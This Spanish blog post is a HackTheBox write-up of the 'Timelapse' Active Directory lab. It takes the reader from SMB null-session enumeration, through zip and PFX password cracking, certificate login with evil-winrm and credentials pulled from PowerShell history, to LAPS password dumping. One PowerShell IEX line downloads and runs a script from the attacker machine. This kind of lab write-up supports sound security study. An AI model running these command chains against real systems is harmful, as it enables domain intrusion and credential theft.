---
layout: single
author_profile: true
title: HTB timelapse AD
excerpt: "Vamos a resolver la máquina timelapse AD de HackTheBox. ¡Let's hack!"
date: 2023-02-01
classes: wide
header:
  teaser: /assets/images/timelapse/01-inicio.png
  teaser_home_page: true
categories:
  - HackTheBox
tags:
  - Writeup
  - Timelapse
  - Active Directory
---

<p align="center">
<img src="/assets/images/timelapse/02-tarjeta.png">
</p>

¡Hola!
En esta ocasión vamos a resolver de la máquina `timelapse` AD de [HackTheBox](https://hackthebox.com/).
La máquina es nivel “Easy”, sin embargo, el nivel siempre se lo pones tú, al enfrentar estos retos, ¡vamos a ponernos hack!

## PREPARACIÓN

Para iniciar nuestra máquina, vamos a crear con nuestra función [mkhack](https://bast1ant1c.github.io/mkhack/) un directorio de trabajo con el nombre `timelapse` y los subdirectorios `recon` junto con `exploit`, con el objetivo de organizar la información que recopilemos en la realización de la máquina.

```bash
mkhack timelapse
cd !$/recon 
```

## RECONOCIMIENTO  

Accedemos al directorio `recon` e iniciamos nuestra fase de reconocimiento sobre el objetivo por medio de nuestra utilidad [osping](https://bast1ant1c.github.io/osping/) detectando el tipo de sistema operativo basado en el `ttl` _time to live_ de una traza **ICMP**.

```bash
osping 10.10.11.152
```
```bash
[*] Detectando sistema operativo ...

[+] 10.10.11.152 ttl=127 >> Windows
```

Identificamos que es una maquina **Windows** debido a su ttl (time to live) correspondiente a 127 (Disminuye en 1 debido a que realiza un salto adicional en el entorno de HackTHeBox).

* TTL => 64	Linux
* TTL => 128	Windows

Continuamos con la enumeración de los **65535** puertos en la máquina. 

```bash
sudo nmap -p- --open -sS --min-rate 5000 -n -Pn 10.10.11.152 -oG ports | grep open
```
```bash
PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5986/tcp  open  wsmans
9389/tcp  open  adws
49667/tcp open  unknown
49673/tcp open  unknown
49674/tcp open  unknown
49692/tcp open  unknown
49705/tcp open  unknown
```

Luego de identificar los puertos abiertos `OPEN`, se procede a escanear servicios y versiones que puedan estar en nuestro objetivo.

```bash
nmap -p53,88,135,139,389,445,464,593,636,3268,3269,5722,9389,47001,49152,49153,49154,49155,49157,49158,49165,49168,49169 -sCV 10.10.11.152 -oN versions
```
```bash
PORT      STATE SERVICE           VERSION
53/tcp    open  domain            Simple DNS Plus
88/tcp    open  kerberos-sec      Microsoft Windows Kerberos (server time: 2023-01-17 06:48:51Z)
135/tcp   open  msrpc             Microsoft Windows RPC
139/tcp   open  netbios-ssn       Microsoft Windows netbios-ssn
389/tcp   open  ldap              Microsoft Windows Active Directory LDAP (Domain: timelapse.htb0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ldapssl?
3268/tcp  open  ldap              Microsoft Windows Active Directory LDAP (Domain: timelapse.htb0., Site: Default-First-Site-Name)
3269/tcp  open  globalcatLDAPssl?
5986/tcp  open  ssl/http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_ssl-date: 2023-01-17T06:50:22+00:00; +8h00m08s from scanner time.
|_http-server-header: Microsoft-HTTPAPI/2.0
| ssl-cert: Subject: commonName=dc01.timelapse.htb
| Not valid before: 2021-10-25T14:05:29
|_Not valid after:  2022-10-25T14:25:29
| tls-alpn: 
|_  http/1.1
|_http-title: Not Found
9389/tcp  open  mc-nmf            .NET Message Framing
49667/tcp open  msrpc             Microsoft Windows RPC
49673/tcp open  msrpc             Microsoft Windows RPC
49674/tcp open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
49692/tcp open  msrpc             Microsoft Windows RPC
49705/tcp open  msrpc             Microsoft Windows RPC
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows
```

## AD DOMAIN DETECTION
 
Iniciamos con la detección del `dominio` donde inicialmente, por medio de la utilidad `crackmapexec` enumeramos información necesaria para tener un mejor alcance a la máquina víctima.

```bash
crackmapexec smb 10.10.11.152
```
```bash
SMB         10.10.11.152    445    DC               [*] Windows 6.1 Build 7601 x64 (name:DC) (domain:timelapse.htb) (signing:True) (SMBv1:False)
```

Agregamos en el archivo `/etc/hosts`

```bash
sudo su
nvim /etc/hosts
10.10.11.152  DC DC.timelapse.htb timelapse.htb
```

## SMB NULL SESSION ENUM

Eumeramos información por null session

```bash
crackmapexec smb 10.10.11.152 --shares
```
```bash
SMB         10.10.11.152    445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:timelapse.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.152    445    DC01             [-] Error enumerating shares: SMB SessionError: STATUS_USER_SESSION_DELETED(The remote user session has been deleted.)
```

```bash
smbclient -L 10.10.11.152 -N
```
```bash
Anonymous login successful
  Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
	NETLOGON        Disk      Logon server share 
	Shares          Disk      
	SYSVOL          Disk      Logon server share 
SMB1 disabled -- no workgroup available
```

Revisamos los archivos con capacidad de lectura, encontrando `winrm.backup.zip`, el cual esta cifrado, por lo tanto descargamos este archivo en nuestra máquina.

```bash
smbclient //10.10.11.152/Shares -N
```
```bash
Try "help" to get a list of possible commands.
```
```bash
smb: \> ls
```
```bash
  .                                   D        0  Mon Oct 25 10:39:15 2021
  ..                                  D        0  Mon Oct 25 10:39:15 2021
  Dev                                 D        0  Mon Oct 25 14:40:06 2021
  HelpDesk                            D        0  Mon Oct 25 10:48:42 2021
cd 
		6367231 blocks of size 4096. 1272576 blocks available
```
```bash
smb: \> cd Dev
```
```bash
smb: \Dev\> ls
```
```bash
  .                                   D        0  Mon Oct 25 14:40:06 2021
  ..                                  D        0  Mon Oct 25 14:40:06 2021
  winrm_backup.zip                    A     2611  Mon Oct 25 10:46:42 2021

		6367231 blocks of size 4096. 1271900 blocks available
```
```bash
smb: \Dev\> get winrm_backup.zip
```
```bash
getting file \Dev\winrm_backup.zip of size 2611 as winrm_backup.zip (2,4 KiloBytes/sec) (average 2,4 KiloBytes/sec)
```

## DECRYPT FILE PASSWORD

Vamos a proceder a crackear la contraseña del archivo `zip` con la utilidad `fcrackzip` para asi lograr evidenciar su contenido.

```bash
unzip winrm_backup.zip
```
```bash
Archive:  winrm_backup.zip
[winrm_backup.zip] legacyy_dev_auth.pfx password: 
   skipping: legacyy_dev_auth.pfx    incorrect password
```

```bash
fcrackzip -vuDp /usr/share/wordlists/rockyou.txt winrm_backup.zip
```
```bash
found file 'legacyy_dev_auth.pfx', (size cp/uc   2405/  2555, flags 9, chk 72aa)
checking pw udei9Qui                                

PASSWORD FOUND!!!!: pw == supremelegacy
```

```bash
unzip winrm_backup.zip
```
```bash
Archive:  winrm_backup.zip
[winrm_backup.zip] legacyy_dev_auth.pfx password: 
  inflating: legacyy_dev_auth.pfx
```

## TRYING TO OPEN PFX FILE

Ahora que logramos descomprimir el archivo `pfx`, ahora con la utilidad `openssl` procedemos a obtener el hash para lograr desencriptar leer la información del archivo.

```bash
openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out priv-key.pem -nodes
```
```bash
Enter Import Password:
Mac verify error: invalid password?
```

## FINDING PFX FILE PASSWORD (PFX2JOHN)

```bash
python3 $(locate pfx2john.py) legacyy_dev_auth.pfx

legacyy_dev_auth.pfx:$pfxng$1$20$2000$20$b'eb755568327396de179c4a5d668ba8fe550ae18a'$b'3082099c3082060f06092a864886f70d010701a0820600048205fc308205f8308205f4060b2a864886f70d010c0a0102a08204fe308204fa301c060a2a864886f70d010c0103300e04084408e3852b96a898020207d0048204d8febcd5536b4b831d491da6d53ca889d95f094572da48eed1a4a14cd88bbfff72924328212c0ff047b42d0b7062b3c6191bc2c23713f986d1febf6d9e1829cd6663d2677b4af8c7a25f7360927c498163168a2543fd722188558e8016f59819657759c27000d365a302da21eda4b73121dcc4eede60533b0ef0873a99b92cc7f824d029385fa8b6859950912cd0a257fa55f150c2135f2850832b3229033f2552f809e70010fab8868bb7d5bef7c20408dac3f67e367f4c3e3b81a555cdfe9e89c7bc44d6996f401f9a26e43094b6fa418a76d5b57579eeb534627a27fd46350a624b139d9ff4b124c9afbbbe42870026098bbc7d38b6b543ab6eff3cf2972c87dd2c0e703ef2a0120062a97279661b67ca596a650efde28e098c82fce01f50611e28d4a6d5d75af8bf965c07faa68331b9f66733deb32ee3628b156ee0ef8e63b732e3606f3c6c9453b49d15592648cd918deaf72889f3e0bcf42bfdb9cddae7e77c5934579d658bfea78800013f36de7e7fadd2f0ff96e78dedaba0593947f96989fad67e17470b49307b5199248fbad36a0dee42e480b30785810a4c17cc27b0e0ed3a99ddec9720a968f3ccbffb36752febbbca437ecacd6c93c6ef2ff6277de01545a482daf34d1faf38819737b7e4ef61004c2876715123fd0b8a4f6c03eb387fd50eaaf4977870a6c011c91f1c9093dc2aa0e2c72c0a5e1473ef89429b02ab1efbf09b096efecb65d6e772d8eb2ca2e72aa288749d6fdbf9b207592f3a9ad16676d9f0aba1fb2f180f7b715b6c2238a42c13b00f8dc26c41ababbca74b84b42294ff473a0f16c85ac7f2072981968f8b868885655f50ea81f06e5e65d269853e537e18268add9046681f9a6d0233d171f900b34cf0c63d299eb67d7a8ebfcfbf88395de5c7fd5bd1085d20cc56b3ca847e6f21fba58215ff91bed70e5f629c9257baa848f29fab2efb9170f8c51e680dde4d6d2eebaa602b24444f43ccfb607efa46f378539664c6309f51d82f67347fc689e855966069099dead6f19adadcf9c6a0d2c42401846eba828bffad6f7336df1ea091844f2074e976a5d2eb83db0646fb43b3faad564ac577781f29de95b7b21b6caf7f9de6d2d56150de098faf9a684b2a79083b3555455272874e9c427e1b1349b94c0baf73eee08832274df7c4ac23b68f66cb86ba0561e1bb83b0e920b4568371c89c2a80ed63308a4d9ce2e12d74de3f83fe5d93ab3aadd65a8821814f9981e20cdb86615d04ef9d45c30d692ad058212b33a0c8966414b3840a77af33b2fe85791a16e4922a9458cb584903515470d57607ce412e0699c883ddd40ad4983f9e6164879a19fc554781823782c89b47c3bf36a6eb4d33194753e85cb13e112a3e9fce98b72565961d1bace71a8086657bce391bdb2a5e4b8025b06984fbb2da341034e9750b33ef2a1dccddde7b867084faf8264a4379c17dfad736a382fa7510e674ca7fefba611cc64313242d3166a04165d4f70607bd988181f06ff4dca04035c14111c7d93a1169efcece8c3616e971131ff54c42a35f3c43f374131b8634999052aa7a479274f6b9d64e414d2775fcf8f7e68897032902547c92885136f0f14e04e62519a02c03a4d0bf412e517f4b51e42ff27b40d7222d722424c56abb1b183158fef0f9d04bbc45d5341a4cb26d03a5864a6f51b9bd315918aa491393a5b6dc622dad6b25e131e43077ab421c4bcd6ed6dfbd52afd4dcb19a27797cbf983181e2300d06092b06010401823711023100301306092a864886f70d0109153106040401000000305d06092a864886f70d01091431501e4e00740065002d00340061003500330034003100350037002d0063003800660031002d0034003700320034002d0038006400620036002d006500640031003200660032003500630032006100390062305d06092b060104018237110131501e4e004d006900630072006f0073006f0066007400200053006f0066007400770061007200650020004b00650079002000530074006f0072006100670065002000500072006f007600690064006500723082038506092a864886f70d010701a0820376048203723082036e3082036a060b2a864886f70d010c0a0103a08203423082033e060a2a864886f70d01091601a082032e0482032a308203263082020ea00302010202101d9989298acf11bb4193a1cff44e12df300d06092a864886f70d01010b050030123110300e06035504030c074c656761637979301e170d3231313032353134303535325a170d3331313032353134313535325a30123110300e06035504030c074c65676163797930820122300d06092a864886f70d01010105000382010f003082010a0282010100a55607a36216471ee2f34d23ad6171ce8b9eb34a872bf689bce78603bbfeaa1c16b835ff3114fe8834d04d9585af0310af28cf1a42c1e9bf7b68a70a50f986d1643bb5371ca1bdf34d4d15e3745415f672222a4a303adea01b617ef4ee60545e0f0271cf9be6183f0b1ba1191857c40ea73222e8d319803089ae02125999941ea4e1c9b156ffb3ce99ed60b3ab623755c5a0fbb5ccd3986882f776d65a6b35dc2f0e88a532513c90161adb6ac85a26998ac9a82cc249a5aef631b4a7584a2bb9a4eb0bc1491f107c75b6a97f7e35b2ca7a00adfbf8c06babb657d96ef8adcc0b635a4b33a8222e472cc8e7aee8d1a02c77bfa6572f428f085cc3304a8b1491f10203010001a3783076300e0603551d0f0101ff0404030205a030130603551d25040c300a06082b0601050507030230300603551d1104293027a025060a2b060104018237140203a0170c156c6567616379794074696d656c617073652e687462301d0603551d0e04160414ccd90ee4af209eb0752bfd81961eac2db1255819300d06092a864886f70d01010b050003820101005f8efb76bfde3efe96fdda72c84b8ae76bb0882aba9a9bdeba1fc905eadee91d93e510364caf5eeee7492f4cdd43e0fb650ae77d49a3eca2449b28da05817d4a357e66ef6174dca08b226875cf896dc6c73a2603a09dc0aa7457d7dedd04cb747b286c7aade2edbd4e0567e9e1be55d3789fcf01773f7f06b6adf88fb1f579d564ce604cdc8299e074726d06a9ae370ded9c42a680caa9eb9298ce9293bef335263848e6dc4686a6dd59b9f6952e308c6cb7606459c3aa0cebaec6175dd5ab65f758764ae4d68ffb929ac1dfc9f8cb3aae26343c36e19f1d78def222a0760c8860a72ac1dd5a232b1b65162cea1e52b9549a9af4ebd918fe79fbfb34846b6a403115301306092a864886f70d0109153106040401000000'$b'86b99e245b03465a6ce0c974055e6dcc74f0e893':::::legacyy_dev_auth.pfx``
```

## CRACKPKCS12 INSTALL

Una vez obtenemos el hash, procedemos a instalar la herramienta `crackpkcs12` para crackear la contraseña del archivo `pfx`.

```bash
apt install libssl-dev; git clone https://github.com/crackpkcs12/crackpkcs12; cd crackpkcs12; ./configure; make; make install
```
## FINDING PFX FILE PASSWORD (CRACKPKCS12)

Procedemos a obtener el password con la utilidad previamente instalada y el diccionario de palabras `rockyou`.

```bash
crackpkcs12 -d /usr/share/wordlists/rockyou.txt ../legacyy_dev_auth.pfx
```
```bash
Dictionary attack - Starting 4 threads

*********************************************************
Dictionary attack - Thread 1 - Password found: thuglegacy
*********************************************************
```

## OPENING PFX FILE

Vamos a abrir el archivo `pfx` con la contraseña encontrada anteriormente, por lo que con `openssl` obtenemos el certificado y clave para lograr conectarnos remotamente a la máquina víctima.

```bash
openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out priv-key.pem -nodes
```
```bash
Enter Import Password:
```

```bash
openssl pkcs12 -in legacyy_dev_auth.pfx -nokeys -out certificate.pem
```
```bash
Enter Import Password:
```

## GRANTED ACCESS LEGACYY USER (EVIL-WINRM SSL)

Ahora tenemos lo necesario para conectarnos remotamente por medio de un certificado `SSL`, haciendo uso de la utilidad `evil-winrm`.

```bash
evil-winrm -i <IP> -c certificate.pem -k priv-key.pem -S
```
```bash
whoami
```
```bash
timelapse\legacyy
```

## AD ENUM LOCAL

Nos encontramos dentro de la máquina víctima, sin embargo, necesitamos escalar privilegios, por lo tanto, debemos enumerar la máquina para obtener más información que nos pueda ayudar.

### USUARIOS DE LA MÁQUINA

```bash
net user
```
```bash
User accounts for \\

-------------------------------------------------------------------------------
Administrator            babywyrm                 Guest
krbtgt                   legacyy                  payl0ad
sinfulz                  svc_deploy               thecybergeek
TRX
The command completed with one or more errors.
```

### GRUPOS Y PRIVILEGIOS DEL USUARIO ACTUAL

```bash
whoami /priv
```
```bash
PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
```

### INFORMACIÓN GENERAL DE UN USUARIO

```bash
net user legacyy
```
```bash
User name                    legacyy
Full Name                    Legacyy
Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            10/23/2021 11:17:10 AM
Password expires             Never
Password changeable          10/24/2021 11:17:10 AM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   1/16/2023 11:41:02 PM

Logon hours allowed          All

Local Group Memberships      *Remote Management Use
Global Group memberships     *Domain Users         *Development
The command completed successfully.
```

```bash
net user svc_deploy
```
```bash
User name                    svc_deploy
Full Name                    svc_deploy
Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            10/25/2021 11:12:37 AM
Password expires             Never
Password changeable          10/26/2021 11:12:37 AM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   10/25/2021 11:25:53 AM

Logon hours allowed          All

Local Group Memberships      *Remote Management Use
Global Group memberships     *LAPS_Readers         *Domain Users
The command completed successfully.
```

### HISTORIAL DE COMANDOS

```bash
cd ..
```
```bash
type AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
```
```bash
whoami
ipconfig /all
netstat -ano |select-string LIST
$so = New-PSSessionOption -SkipCACheck -SkipCNCheck -SkipRevocationCheck
$p = ConvertTo-SecureString 'E3R$Q62^12p7PLlC%KWaxuaV' -AsPlainText -Force
$c = New-Object System.Management.Automation.PSCredential ('svc_deploy', $p)
invoke-command -computername localhost -credential $c -port 5986 -usessl -
SessionOption $so -scriptblock {whoami}
get-aduser -filter * -properties *
exit
```

## GRANTED ACCESS SVC_DEPLOY USER

En el historial de comandos logramos ver una credencial para el usuario `svc_deploy`, asi que con `crackmapexec` vamos a validar la credencial y si es el caso, nos conectamos a la máquina víctima.

```bash
crackmapexec smb 10.10.11.152 -u 'svc_deploy' -p 'E3R$Q62^12p7PLlC%KWaxuaV'
```
```bash
SMB         10.10.11.152    445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:timelapse.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.152    445    DC01             [+] timelapse.htb\svc_deploy:E3R$Q62^12p7PLlC%KWaxuaV 
```

```bash
evil-winrm -i 10.10.11.152 -u 'svc_deploy' -p 'E3R$Q62^12p7PLlC%KWaxuaV' -S
```
```bash
whoami
```
```bash
timelapse\svc_deploy
```

## SHARING GET-LAPSPASSWORDS.PS1

Este usuario `svc_deploy` tenia la capacidad de leer credenciales de `LAPS`, asi que vamos a aprovechar esta capacidad por medio del binario `Get-LAPSPasswords.ps1`, luego de traer el binario a nuestra máquina atacante, transmitimos este a la máquina víctima y procedemos a ejecutarlo.

#### MÁQUINA ATACANTE

```bash
git clone https://github.com/kfosaaen/Get-LAPSPasswords
```
```bash
cd Get-LAPSPasswords
```
```bash
sudo python3 -m http.server 80
```

#### MÁQUINA VÍCTIMA
```bash
IEX(New-Object Net.WebClient).downloadString('http://<IP_ATACANTE>/Get-LAPSPasswords.ps1')
```
```bash
Get-LAPSPasswords
```
```bash
Get-LAPSPasswords

Hostname   : dc01.timelapse.htb
Stored     : 1
Readable   : 1
Password   : 82oF3(d69XO5U&6zY}g!88.2
Expiration : 1/21/2023 10:42:40 PM
```

## GRANTED ACCESS ADMINISTRATOR USER

Tenemos la credencial del usuario `Administrator`, ahora vamos a validarlo por `smb` con la utilidad `crackmapexec` y ya obteniendo un acceso como administrador `Pwn3d`, procedemos con la utilidad `evil-winrm` a entablar una conexión directamente con la máquina víctima. 

```bash
crackmapexec smb 10.10.11.152 -u 'administrator' -p '82oF3(d69XO5U&6zY}g!88.2'
```
```bash
SMB         10.10.11.152    445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:timelapse.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.152    445    DC01             [+] timelapse.htb\administrator:82oF3(d69XO5U&6zY}g!88.2 (Pwn3d!)
```

```bash
evil-winrm -i 10.10.11.152 -u 'administrator' -p '82oF3(d69XO5U&6zY}g!88.2' -S
```
```bash
whoami
```
```bash
timelapse\administrator
```

## FLAGS

Lo único que nos queda es leer las banderas de user y root. Pueden ver la flag con `type`, pero para hacerlo más retador solo dejaré los primeros 10 caracteres de la flag. 

```bash
(Get-Content "C:\Documents and Settings\legacyy\Desktop\user.txt").Substring(0,10)
7fc2c03c50
```

```bash
(Get-Content C:\users\TRX\Desktop\root.txt).Substring(0,10)
2e8419fd4a
```

¡Hemos logrado completar la máquina `timelapse` de HackTheBox!

<p align="center">
<img src="/assets/images/timelapse/03-finish.png">
</p>

_¡Que tengan un buen día en el planeta donde se encuentren!_

**Nos vemos en otro bit.**
